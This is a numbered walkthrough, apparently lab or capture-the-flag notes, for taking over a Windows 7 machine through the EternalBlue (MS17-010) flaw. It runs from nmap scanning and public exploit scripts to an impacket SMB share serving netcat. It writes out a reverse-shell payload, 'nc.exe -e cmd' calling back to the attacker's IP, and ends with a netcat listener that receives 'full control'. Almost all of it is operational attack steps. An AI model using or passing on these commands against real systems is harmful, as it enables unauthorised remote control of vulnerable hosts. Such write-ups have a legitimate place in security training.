1. Enumerate with nmap

2. After seeing that the machine is a Windows 7 you can try to look for an eternal blue with nmap and .nse scripts. usage: "nmap -p __{PORT}__ __{IP}__ --scripts "vuln and safe""

3. According to nmap the machine is susceptible to EternalBlue attack so you can go to worawit MS17-010 exploit in order to get a python2 script to exploit the vuln automatically

4. Install everything needed to run the checker.py with "python2 -m pip install __{impacket}__"

5. Run the checker.py program with the username set to __guest__ in order to not get your connection rejected

6. Run the zzz_autoexploit.py with the username also set to guest and the command to execute after exploit to "cmd /c \\\\__{LOCAL-IP}__\\__{FOLDER}__\\nc.exe -e cmd __{LOCAL-IP}__ __{PORT}__"
As you're on a powershell, this command tells windows to open a cmd and run the code after the /c flag
    - \\\\__{IP}__\\__{FOLDER}__\\nc.exe : Tells windows to search the file "nc.exe" in the network share in __{IP}__ in the folder __{FOLDER}__
	- "-e cmd __{LOCAL-IP}__ __{PORT}__" : Tells the nc app to start cmd and recieve and send: output, input and errors to __{IP}__ __{PORT}__ specified

7. Download netcat for windows in order to serve it to the "client" that is going to ask for it with the eternal blue exploit

8. Start in your local machine the smb server with impacket. usage: impacket-smbserver __{FOLDER}__ __{NETCAT-PATH}__ -smb2support
    __{FOLDER}__ : It's going to be the name of the server we're setting the client later asks for (previously set in the exploit) when entering the network share __{LOCAL-IP}__
    __{NETCAT-PATH}__: It's has to be the local folder with the nc.exe eg.: $(pwd) if nc.exe is in the folder you're currently at.
	-smb2support : It's used if you want to make your server smb2 supportive

9. Start the local server the victim's machine will try to connect when executes the command with the netcat previously downloaded from the network share. Usage: "nc -lvnp __{PORT}__"
- -l : Set the port to a listen state
- -v : Verbose 
- -n : Don't apply dns resolution
- -p : Port:

10. Send the exploit to the machine and recieve full control in the netcat listening service previously set.